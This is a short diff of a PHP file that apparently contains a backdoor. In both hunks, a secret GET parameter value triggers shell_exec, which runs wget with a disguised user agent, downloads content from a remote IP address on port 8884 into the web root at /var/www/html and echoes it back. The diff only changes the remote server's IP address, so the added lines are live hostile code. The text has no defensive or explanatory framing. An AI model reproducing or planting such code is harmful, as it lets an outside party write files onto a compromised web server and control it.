@@ -9,7 +9,7 @@ if($_GET["linux84"] == "linux8474")
   
 {
 
-echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://107.174.39.107:8884/?linux84=linux8474;cat /var/www/html/linux84");
+echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://154.127.52.52:8884/?linux84=linux8474;cat /var/www/html/linux84");
 
 }
 
@@ -45,7 +45,7 @@ if($_GET["linux84"] == "linux84742")
   
 {
 
-echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://107.174.39.107:8884/?linux84=linux84742;cat /var/www/html/linux84");
+echo shell_exec("wget -q -U 'Mozille84' -O /var/www/html/linux84 http://154.127.52.52:8884/?linux84=linux84742;cat /var/www/html/linux84");
 
 }
 
